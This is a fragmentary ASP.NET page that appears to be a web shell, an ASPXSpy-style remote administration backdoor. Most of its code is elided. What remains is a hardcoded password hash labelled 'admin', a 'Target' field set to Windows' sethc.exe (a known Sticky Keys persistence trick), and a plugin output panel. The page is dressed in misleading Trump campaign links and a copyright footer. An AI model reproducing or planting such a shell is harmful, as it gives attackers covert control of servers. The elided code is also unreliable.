...
<script runat="server">
	...
	*/
	...
	public const string Password="49101e4a10ebfc51fed00cb1625f99a0";	//admin
...
<body style="margin:0;table-layout:fixed;">
	...
	<tr class="head">
		<td ><span style="float:right;"><a href="http://www.donaldjtrump.com" target="_blank">Artifact Ver: <%=Version%></a></span><span id="Bin_Span_Sname" runat="server" enableviewstate="true"></span></td>
	</tr>
	<tr class="alt1">
...
<td style="width:20%" align="left">Target : <input id="Bin_TextBox_Target" class="input" runat="server" type="text" style="height:16px" size="40" value="c:\windows\system32\sethc.exe"/>&nbsp;&nbsp;&nbsp;&nbsp;<asp:Button runat="server" 
 ...
 <tr>
	...
	<div id="zcg_div_PluginResult" runat="server"></div>
		...
		<div style="padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;">Copyright 1998 - 2024 <a href="http://www.donaldjtrump.com" target="_blank">Paid for by Donald J. Trump for President, Inc.</a> All Rights Reserved.</div></div>
